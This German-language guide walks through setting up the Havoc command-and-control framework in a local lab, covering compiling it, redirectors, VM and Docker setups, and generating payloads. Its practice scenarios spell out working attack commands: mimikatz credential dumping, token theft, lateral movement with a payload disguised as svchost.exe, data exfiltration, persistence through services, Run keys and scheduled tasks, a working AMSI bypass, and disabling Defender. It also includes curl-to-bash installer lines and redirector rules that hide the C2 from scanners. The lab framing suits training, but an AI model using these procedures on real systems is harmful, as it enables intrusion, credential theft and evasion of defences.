# Lokales Setup - Schritt-für-Schritt-Anleitung

> **Ziel:** Havoc C2 komplett auf Ihrem lokalen PC/Laptop testen und durcharbeiten, ohne VPS-Kosten.

---

## 📋 Inhaltsverzeichnis

1. [Voraussetzungen](#voraussetzungen)
2. [Lokales Lab-Setup](#lokales-lab-setup)
3. [Schritt-für-Schritt: Erstmaliges Setup](#schritt-für-schritt-erstmaliges-setup)
4. [Lokale Redirector-Tests](#lokale-redirector-tests)
5. [VM-basiertes Multi-Host-Lab](#vm-basiertes-multi-host-lab)
6. [Docker-basiertes Setup](#docker-basiertes-setup)
7. [Lokale Payload-Tests](#lokale-payload-tests)
8. [Übungsszenarien](#übungsszenarien)

---

## Voraussetzungen

### Hardware-Anforderungen

**Minimum:**
- CPU: 4 Cores
- RAM: 8 GB
- Disk: 50 GB frei
- OS: Ubuntu 20.04/22.04, Kali Linux, oder Windows mit WSL2

**Empfohlen:**
- CPU: 8 Cores
- RAM: 16 GB
- Disk: 100 GB SSD
- OS: Kali Linux oder Ubuntu 22.04

### Software-Voraussetzungen

```bash
# Für Linux/Kali:
- Git
- Build-Tools (gcc, make, cmake)
- Go 1.19+
- Qt5-Libraries
- VirtualBox oder VMware (für Multi-Host-Lab)

# Für Windows:
- WSL2 (Ubuntu 22.04)
- VirtualBox
- Windows Terminal (optional, aber empfohlen)
```

---

## Lokales Lab-Setup

### Architektur-Optionen

#### Option 1: All-in-One (Einfachste)

```
┌─────────────────────────────────────┐
│      Ihr PC/Laptop (Kali Linux)    │
│                                     │
│  ┌──────────────┐  ┌─────────────┐ │
│  │ Havoc Server │  │ Havoc Client│ │
│  │ Port 40056   │  │   (GUI)     │ │
│  └──────────────┘  └─────────────┘ │
│         ↑                           │
│         │ localhost                │
│         ↓                           │
│  ┌──────────────┐                  │
│  │   Test VM    │                  │
│  │  (Windows)   │                  │
│  └──────────────┘                  │
└─────────────────────────────────────┘
```

**Vorteil:** Einfach, keine Netzwerk-Konfiguration
**Nachteil:** Nicht realistisch

---

#### Option 2: Multi-VM Lab (Realistisch)

```
┌────────────────────────────────────────────────────┐
│           Ihr Host-PC (Kali Linux)                 │
│                                                    │
│  ┌─────────────┐                                  │
│  │Havoc Client │                                  │
│  │   (GUI)     │                                  │
│  └──────┬──────┘                                  │
│         │                                          │
│    ┌────┴────────────────────────────────┐        │
│    │    Internal Network (192.168.56.0/24) │      │
│    │                                       │        │
│    │  ┌──────────┐  ┌──────────┐  ┌─────┴─────┐ │
│    │  │ VM1:     │  │ VM2:     │  │ VM3:      │ │
│    │  │ Teamserv.│  │Redirector│  │ Target    │ │
│    │  │.56.10    │  │.56.20    │  │ Windows   │ │
│    │  └──────────┘  └──────────┘  │.56.30     │ │
│    │                               └───────────┘ │
│    └───────────────────────────────────────────┘ │
└────────────────────────────────────────────────────┘
```

**Vorteil:** Realistisch, testet Netzwerk-Konfiguration
**Nachteil:** Ressourcen-intensiv

---

## Schritt-für-Schritt: Erstmaliges Setup

### Schritt 1: Kali Linux Installation (falls noch nicht vorhanden)

**Option A: Native Installation**

```bash
# Download Kali Linux ISO
https://www.kali.org/get-kali/

# Brennen auf USB mit:
# - Rufus (Windows)
# - Etcher (Linux/Mac/Windows)

# Installation durchführen (Standard)
```

**Option B: VM Installation**

```bash
# Download Kali Linux VirtualBox Image (empfohlen)
https://www.kali.org/get-kali/#kali-virtual-machines

# Importieren in VirtualBox:
# File → Import Appliance → Kali.ova auswählen

# VM Settings:
# - RAM: 4096 MB (4 GB) minimum, 8192 MB empfohlen
# - CPUs: 2-4
# - Disk: 80 GB dynamisch
# - Network: NAT + Host-Only Adapter
```

**Option C: WSL2 (für Windows-User)**

```powershell
# In PowerShell (als Administrator):
wsl --install -d kali-linux

# Nach Installation:
wsl -d kali-linux

# In WSL:
sudo apt update && sudo apt upgrade -y
```

---

### Schritt 2: System vorbereiten

```bash
# Terminal öffnen

# 1. System aktualisieren
sudo apt update && sudo apt upgrade -y

# 2. Alle benötigten Pakete installieren
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
    libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
    libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
    libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser \
    qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
    qtdeclarative5-dev golang-go mingw-w64 nasm vim curl wget net-tools

# 3. Go-Version prüfen (mind. 1.19)
go version

# Falls Go zu alt oder fehlt:
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
```

**✓ Checkpoint:** `go version` zeigt mindestens Go 1.19

---

### Schritt 3: Havoc Framework klonen und kompilieren

```bash
# 1. Verzeichnis erstellen (optional, für Organisation)
mkdir -p ~/c2-lab
cd ~/c2-lab

# 2. Havoc klonen
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# 3. Go-Dependencies laden
cd teamserver
go mod download golang.org/x/sys || true
go mod download github.com/ugorji/go || true
cd ..

# 4. Teamserver kompilieren
make ts-build

# Dies dauert 2-5 Minuten. Bei Erfolg erscheint:
# [+] Teamserver binary compiled successfully
```

**✓ Checkpoint:** `ls -lh havoc` zeigt die Binary

```bash
# 5. Client kompilieren
make client-build

# Dies dauert 5-10 Minuten (Qt-Kompilierung)
```

**✓ Checkpoint:** `ls -lh Build/bin/Havoc` zeigt den Client

**Bei Fehlern:**

```bash
# Häufigster Fehler: Qt5-Pakete fehlen
sudo apt install -y qtbase5-dev qtdeclarative5-dev libqt5websockets5-dev

# Oder: Go zu alt
# Siehe Schritt 2 für manuelle Go-Installation

# Compile-Logs prüfen:
make ts-build 2>&1 | tee build.log
```

---

### Schritt 4: Erste Teamserver-Konfiguration erstellen

```bash
cd ~/c2-lab/Havoc

# 1. Profil-Verzeichnis prüfen
ls -la profiles/

# 2. Erste Konfiguration erstellen
nano profiles/local-lab.yaotl
```

**Inhalt (für lokales Testing):**

```yaml
Teamserver:
  Host: 0.0.0.0
  Port: 40056
  
  Build:
    Compiler64: "/usr/bin/x86_64-w64-mingw32-gcc"
    Compiler86: "/usr/bin/i686-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"

Operators:
  - Name: admin
    Password: "admin123"
  
  - Name: operator1
    Password: "operator123"

Listeners:
  - Name: "Local HTTPS Listener"
    Protocol: https
    Hosts:
      - "localhost"
      - "127.0.0.1"
    Port: 8443
    HostBind: 0.0.0.0
    PortBind: 8443
    Secure: true
    
    Response:
      Headers:
        Server: "Apache/2.4.52 (Ubuntu)"
        Content-Type: "text/html; charset=UTF-8"
```

**Speichern:** `Ctrl+O`, Enter, `Ctrl+X`

---

### Schritt 5: Teamserver zum ersten Mal starten

```bash
cd ~/c2-lab/Havoc

# Terminal 1: Teamserver starten
./havoc server --profile ./profiles/local-lab.yaotl -v --debug
```

**Erwartete Ausgabe:**

```
[*] Havoc Framework [Version: x.x.x]
[*] Starting Teamserver...
[+] Teamserver listening on 0.0.0.0:40056
[+] Listener "Local HTTPS Listener" started on 0.0.0.0:8443
```

**✓ Checkpoint:** Keine Fehlermeldungen, Server läuft

**Häufige Fehler:**

```bash
# Port bereits belegt:
[!] Error: address already in use

# Lösung:
sudo netstat -tlnp | grep 40056
sudo kill -9 PID

# Compiler nicht gefunden:
[!] Error: compiler not found

# Lösung:
which x86_64-w64-mingw32-gcc
# Falls leer:
sudo apt install mingw-w64
```

---

### Schritt 6: Client starten und verbinden

**WICHTIG:** Lassen Sie Terminal 1 (Teamserver) geöffnet!

```bash
# Terminal 2 öffnen (Neues Terminal)
cd ~/c2-lab/Havoc/Build/bin

# Client starten
./Havoc
```

**Havoc GUI öffnet sich**

**Schritt 6.1: Profil erstellen**

1. In Havoc GUI: Klick auf **"Profiles"** (oben)
2. Klick auf **"New Profile"**
3. Ausfüllen:
   - **Profile Name:** "Local Lab"
   - **Host:** 127.0.0.1 (oder localhost)
   - **Port:** 40056
   - **User:** admin
   - **Password:** admin123
4. Klick auf **"Save"**

**Schritt 6.2: Verbinden**

1. Profil "Local Lab" auswählen
2. Klick auf **"Connect"**

**✓ Checkpoint:** Verbindung erfolgreich, kein Fehler-Popup

---

### Schritt 7: Ersten Listener erstellen

Der Listener aus der yaotl-Config sollte bereits laufen.

**Überprüfen:**

1. In Havoc GUI: **View** → **Listeners**
2. Sie sollten sehen:
   - **Name:** Local HTTPS Listener
   - **Status:** Started
   - **Address:** 0.0.0.0:8443

**Falls nicht gestartet:**
- Rechtsklick auf Listener → **Start**

---

### Schritt 8: Erste Payload generieren

1. In Havoc GUI: **Attack** → **Payload**

2. Konfiguration:
   - **Listener:** Local HTTPS Listener
   - **Arch:** x64 (für moderne Windows)
   - **Format:** Windows Exe
   - **Indirect Syscalls:** ✓ (aktivieren)
   - **Sleep Obfuscation:** ✓ (aktivieren)

3. Klick auf **"Generate"**

4. Speichern als: `~/c2-lab/payloads/test-beacon.exe`

**✓ Checkpoint:** Datei wurde erstellt

```bash
ls -lh ~/c2-lab/payloads/test-beacon.exe
```

---

### Schritt 9: Test-Umgebung vorbereiten

**Option A: Windows VM (Empfohlen)**

```bash
# 1. Windows 10/11 VM in VirtualBox/VMware
# Download: https://www.microsoft.com/en-us/software-download/windows10

# 2. VM-Netzwerk:
# - Adapter 1: NAT (für Internet)
# - Adapter 2: Host-Only (für C2-Kommunikation)

# 3. Windows Defender temporär deaktivieren:
# Settings → Update & Security → Windows Security → 
# Virus & threat protection → Manage settings → 
# Real-time protection OFF

# 4. Payload übertragen:
# - Über Shared Folder
# - Oder Python HTTP Server:
cd ~/c2-lab/payloads
python3 -m http.server 8000

# In Windows VM Browser:
# http://KALI_IP:8000/test-beacon.exe
```

**Option B: Wine (für Schnelltest)**

```bash
# Wine installieren (Linux only)
sudo apt install wine64 wine32

# Payload ausführen
cd ~/c2-lab/payloads
wine test-beacon.exe
```

**⚠️ Warnung:** Wine ist nicht perfekt für C2-Testing!

---

### Schritt 10: Payload ausführen und Session erhalten

**In Windows VM:**

1. Payload ausführen: Doppelklick auf `test-beacon.exe`
2. Windows Defender Warnung (falls aktiviert): "Run anyway"

**In Havoc Client:**

Nach 5-10 Sekunden sollte eine Session erscheinen:

**View** → **Sessions**

**Session-Details:**
- **Computer:** WIN10-LAB (oder ähnlich)
- **User:** Administrator
- **Process:** test-beacon.exe
- **PID:** z.B. 4532
- **Arch:** x64

**✓ Checkpoint:** Session ist aktiv (grün)

---

### Schritt 11: Erste Befehle ausführen

**Rechtsklick auf Session → "Interact"**

Ein Console-Fenster öffnet sich.

**Basis-Kommandos:**

```bash
# System-Information
whoami
hostname
ipconfig

# Prozess-Liste
ps

# Verzeichnis-Listing
ls C:\

# Datei herunterladen
download C:\Windows\System32\drivers\etc\hosts

# Screenshot
screenshot

# Shell-Kommando ausführen
shell dir C:\Users
```

**Erweiterte Kommandos:**

```bash
# Process Injection in Explorer
inject explorer.exe

# Token-Manipulation
token list
token steal PID

# Mimikatz (eingebaut)
# Erfordert Admin-Rechte
mimikatz sekurlsa::logonpasswords
```

---

### Schritt 12: Session beenden

```bash
# In Session-Console:
exit

# Session verschwindet aus der Liste
```

**In Windows VM:**

Prozess ist beendet (nicht mehr in Task Manager).

---

## Lokale Redirector-Tests

### Apache Redirector lokal testen

```bash
# 1. Apache installieren
sudo apt install apache2

# 2. Module aktivieren
sudo a2enmod rewrite proxy proxy_http ssl headers

# 3. Konfiguration erstellen
sudo nano /etc/apache2/sites-available/local-redirector.conf
```

**Inhalt:**

```apache
<VirtualHost *:9443>
    ServerName localhost

    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
    SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key

    RewriteEngine On

    # Blockiere Scanner
    RewriteCond %{HTTP_USER_AGENT} ^.*(curl|wget).*$ [NC]
    RewriteRule ^.*$ - [F,L]

    # Proxy zu lokalem Teamserver
    RewriteCond %{REQUEST_URI} ^/
    RewriteRule ^.*$ https://127.0.0.1:8443%{REQUEST_URI} [P,L]

    ProxyRequests Off
    ProxyPreserveHost On
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
</VirtualHost>
```

```bash
# 4. Aktivieren
sudo a2ensite local-redirector.conf
sudo systemctl restart apache2

# 5. Testen
curl -k https://localhost:9443/test
# Sollte zu Havoc weitergeleitet werden
```

---

### Nginx Redirector lokal testen

```bash
# 1. Nginx installieren
sudo apt install nginx

# 2. Konfiguration
sudo nano /etc/nginx/sites-available/local-redirector
```

```nginx
upstream local_c2 {
    server 127.0.0.1:8443;
}

server {
    listen 9444 ssl;
    server_name localhost;

    ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    location / {
        proxy_pass https://local_c2;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

```bash
# 3. Aktivieren
sudo ln -s /etc/nginx/sites-available/local-redirector /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx

# 4. Testen
curl -k https://localhost:9444/
```

---

## VM-basiertes Multi-Host-Lab

### Netzwerk-Setup

**VirtualBox Host-Only Network:**

```bash
# 1. In VirtualBox: File → Host Network Manager
# 2. Create new network: vboxnet0
# 3. Configure:
#    IPv4 Address: 192.168.56.1
#    IPv4 Network Mask: 255.255.255.0
#    DHCP Server: Disabled
```

### VM-Konfiguration

**VM1: Teamserver (Ubuntu Server 22.04)**
```
RAM: 2 GB
Disk: 20 GB
Network:
  - Adapter 1: NAT (Internet)
  - Adapter 2: Host-Only (vboxnet0)
IP: 192.168.56.10
```

**VM2: Redirector (Ubuntu Server 22.04)**
```
RAM: 1 GB
Disk: 20 GB
Network:
  - Adapter 1: NAT (Internet)
  - Adapter 2: Host-Only (vboxnet0)
IP: 192.168.56.20
```

**VM3: Target (Windows 10)**
```
RAM: 4 GB
Disk: 40 GB
Network:
  - Adapter 1: Host-Only (vboxnet0) - NUR DIES!
IP: 192.168.56.30
```

**Host (Kali Linux):**
```
IP auf vboxnet0: 192.168.56.1 (automatisch)
```

### Setup-Prozedur

```bash
# === VM1: Teamserver ===
ssh user@192.168.56.10

# Havoc installieren
bash <(curl -s URL/install_havoc_teamserver.sh)

# In yaotl: Listen auf 0.0.0.0:40056 und 0.0.0.0:443

# === VM2: Redirector ===
ssh user@192.168.56.20

# Nginx Redirector installieren
bash <(curl -s URL/install_redirector_nginx.sh)
# C2-IP: 192.168.56.10
# C2-Port: 443

# === Host: Kali ===
cd ~/c2-lab/Havoc/Build/bin
./Havoc

# Connect to: 192.168.56.10:40056

# === VM3: Windows ===
# Payload generieren mit Host: 192.168.56.20
# Payload in Windows ausführen
```

**Ablauf:**

```
Windows (56.30) → Redirector (56.20) → Teamserver (56.10) ← Kali (56.1)
```

---

## Docker-basiertes Setup

### Dockerfile für Teamserver

```dockerfile
# ~/c2-lab/docker/Dockerfile.teamserver
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y \
    git build-essential golang-go \
    mingw-w64 nasm cmake \
    libboost-all-dev libssl-dev && \
    rm -rf /var/lib/apt/lists/*

RUN git clone https://github.com/HavocFramework/Havoc.git /opt/Havoc

WORKDIR /opt/Havoc

RUN cd teamserver && \
    go mod download && \
    cd .. && \
    make ts-build

EXPOSE 40056 443

CMD ["./havoc", "server", "--profile", "/opt/Havoc/profiles/docker.yaotl", "-v"]
```

### Docker Compose Setup

```yaml
# ~/c2-lab/docker/docker-compose.yml
version: '3.8'

services:
  teamserver:
    build:
      context: .
      dockerfile: Dockerfile.teamserver
    ports:
      - "40056:40056"
      - "8443:443"
    volumes:
      - ./profiles:/opt/Havoc/profiles
      - ./logs:/opt/Havoc/logs
    restart: unless-stopped

  redirector:
    image: nginx:alpine
    ports:
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      - teamserver
    restart: unless-stopped
```

**Starten:**

```bash
cd ~/c2-lab/docker
docker-compose up -d

# Logs ansehen
docker-compose logs -f teamserver
```

---

## Lokale Payload-Tests

### Test-Matrix

| Payload-Typ | Test-Umgebung | Zweck |
|-------------|---------------|-------|
| **Windows Exe** | Windows VM | Standard-Test |
| **DLL** | rundll32 | Reflective Loading |
| **Shellcode** | Process Injection | Obfuskation |
| **Service Exe** | Windows Service | Persistence |
| **PowerShell** | PS Console | Fileless |

### Detektions-Tests

```bash
# 1. Payload durch VirusTotal prüfen (NUR LOKAL!)
# NIEMALS echte Payloads zu VT hochladen!

# Lokale Alternative: YARA
sudo apt install yara

# YARA-Regeln für Havoc
yara -r /usr/share/yara/malware/ test-beacon.exe

# 2. Windows Defender Test
# In Windows VM:
# Scan: Windows Security → Virus & threat protection → Quick scan

# 3. AMSI Bypass-Test
# In Havoc Session:
powershell Get-MpComputerStatus
```

---

## Übungsszenarien

### Szenario 1: Basic Infiltration

**Ziel:** Erste Session erhalten und Aufklärung

```
1. Payload generieren (Exe)
2. In Windows VM ausführen
3. Session erhalten
4. Kommandos:
   - whoami /all
   - net user
   - net localgroup administrators
   - systeminfo
   - ipconfig /all
```

**Erfolgskriterium:** Vollständige System-Info gesammelt

---

### Szenario 2: Privilege Escalation

**Ziel:** Von User zu SYSTEM

```
1. Session als normaler User
2. Privilege Check:
   whoami /priv
3. UAC Bypass (falls nötig)
4. Token-Diebstahl:
   ps (finde SYSTEM-Prozess)
   steal_token PID
5. Verify:
   whoami
   # Sollte: NT AUTHORITY\SYSTEM zeigen
```

**Erfolgskriterium:** SYSTEM-Rechte erlangt

---

### Szenario 3: Lateral Movement

**Ziel:** Von VM3 zu VM4 bewegen

**Setup:**
- VM3: Windows 10 (erstes Target)
- VM4: Windows Server 2019 (zweites Target)
- Beide im gleichen Netzwerk

```
1. Session auf VM3
2. Netzwerk-Scan:
   shell arp -a
   shell net view
3. Credentials dumpen:
   mimikatz sekurlsa::logonpasswords
4. Payload auf VM4 übertragen:
   upload payload.exe \\VM4\C$\temp\svchost.exe
5. Remote ausführen:
   shell wmic /node:VM4 process call create C:\temp\svchost.exe
6. Neue Session auf VM4
```

**Erfolgskriterium:** 2 aktive Sessions

---

### Szenario 4: Data Exfiltration

**Ziel:** Sensible Daten extrahieren

```
1. Aktive Session
2. Interessante Dateien finden:
   shell dir C:\Users\*\Documents\*.docx /s
   shell dir C:\Users\*\Desktop\*.pdf /s
3. Herunterladen:
   download C:\Users\Alice\Documents\passwords.xlsx
4. Archiv erstellen:
   shell powershell Compress-Archive C:\Sensitive\* C:\temp\data.zip
   download C:\temp\data.zip
5. Aufräumen:
   shell del C:\temp\data.zip
```

**Erfolgskriterium:** Dateien lokal gespeichert

---

### Szenario 5: Persistence

**Ziel:** Nach Reboot wieder Zugriff

```
1. Aktive SYSTEM-Session
2. Service installieren:
   shell sc create "WindowsUpdater" binPath= "C:\Windows\System32\beacon.exe" start= auto
   upload beacon.exe C:\Windows\System32\beacon.exe
3. Registry Run-Key:
   shell reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /d "C:\Windows\beacon.exe"
4. Scheduled Task:
   shell schtasks /create /tn "SystemUpdate" /tr "C:\Windows\beacon.exe" /sc onlogon /rl highest
5. Windows VM rebooten
6. Nach Reboot: Session sollte zurückkommen
```

**Erfolgskriterium:** Session nach Reboot

---

### Szenario 6: Detection Evasion

**Ziel:** Defender umgehen

```
1. Payload mit Obfuskation:
   - Indirect Syscalls: ON
   - Sleep Obfuscation: ON
   - Stack Duplication: ON
2. Process Injection statt Disk-Execution:
   - Payload als Shellcode
   - Injizieren in explorer.exe
3. AMSI Bypass:
   In PowerShell-Session:
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
4. ETW Bypass:
   (eingebaut in Havoc Demon)
5. Test mit Windows Defender:
   shell "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3
```

**Erfolgskriterium:** Keine Detection

---

## Checkliste: Lokales Lab

### Einrichtung

- [ ] Kali Linux oder Ubuntu installiert
- [ ] Alle Dependencies installiert
- [ ] Havoc Framework kompiliert (Server + Client)
- [ ] Test-Konfiguration erstellt
- [ ] Teamserver startet ohne Fehler
- [ ] Client verbindet sich erfolgreich

### Erste Tests

- [ ] Listener erstellt und gestartet
- [ ] Payload generiert (Exe)
- [ ] Test-VM (Windows) vorbereitet
- [ ] Payload in VM ausgeführt
- [ ] Session erhalten
- [ ] Basis-Kommandos funktionieren

### Erweiterte Tests

- [ ] Redirector lokal getestet
- [ ] Multi-VM-Lab aufgesetzt (optional)
- [ ] Payload-Obfuskation getestet
- [ ] Privilege Escalation durchgeführt
- [ ] Persistence etabliert
- [ ] Detection-Evasion getestet

---

## Troubleshooting Lokal

### Problem: Client startet nicht (Qt-Fehler)

```bash
# Fehler: "libQt5Core.so.5: cannot open shared object file"

# Lösung:
sudo apt install libqt5core5a libqt5gui5 libqt5widgets5 libqt5network5

# Alternative: AppImage nutzen
# (falls verfügbar von Havoc Releases)
```

### Problem: Keine Session trotz Payload-Ausführung

**Checklist:**

```bash
# 1. Listener läuft?
# In Havoc: View → Listeners (Status: Started)

# 2. Windows Firewall?
# In Windows VM: Temporär deaktivieren

# 3. Netzwerk erreichbar?
# In Windows VM:
ping 192.168.56.10  # (Teamserver-IP)
Test-NetConnection 192.168.56.10 -Port 8443

# 4. Teamserver-Logs?
# Terminal 1 (Teamserver) prüfen auf Verbindungen

# 5. Payload korrekt konfiguriert?
# Host muss erreichbar sein (localhost für all-in-one, IP für Multi-VM)
```

### Problem: "Access Denied" bei Mimikatz

```bash
# Mimikatz benötigt Admin-Rechte oder SYSTEM

# Lösung:
# 1. UAC Bypass durchführen
# 2. Oder: Token von Admin-Prozess stehlen
ps
# Finde Prozess mit SYSTEM oder Admin-User
steal_token PID
mimikatz sekurlsa::logonpasswords
```

---

## Nächste Schritte

Nach erfolgreichem lokalen Setup:

1. **Payload-Entwicklung:** → `PAYLOAD_DEVELOPMENT.md`
2. **Post-Exploitation:** → `POST_EXPLOITATION.md`
3. **Production-Deployment:** → `HAVOC_C2_SETUP.md`
4. **Automatisierung:** → `terraform/` und `ansible/`

---

**Erstellt:** 2026-02-05
**Version:** 1.0
